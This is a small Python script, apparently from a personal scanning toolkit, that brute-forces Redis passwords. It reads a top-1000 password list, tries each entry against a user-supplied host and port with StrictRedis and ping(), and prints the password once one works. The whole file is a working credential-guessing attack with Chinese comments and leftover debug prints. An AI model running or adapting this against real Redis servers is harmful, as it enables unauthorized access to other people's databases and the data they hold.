#########################redis爆破#############################
import sys
import os
from redis import StrictRedis
def connect(ips):
 ip = ips
 print('aaaaaa!')
 port = input('请输入端口： ')
 print('bbbbbb!')
 with open('/home/frost/桌面/python/basic_scan/password-top1000.txt') as fp:
    print('ccccc!')
    for p in fp:
        r = StrictRedis(ip, port, password=p.strip("\n"))  # 一定要去掉行尾"\n"换行符，不然正确密
        # print(r)
        try:  # 码也无法验证通过
            response = r.ping()            #进入redis执行ping命令，查看其是否正确
            # print(response)
            if response == True:           #如若正确密码完成的登录，则会返回ture值
                print("cracked,redis password is:" ,p)
                sys.exit(0)
        except:
            pass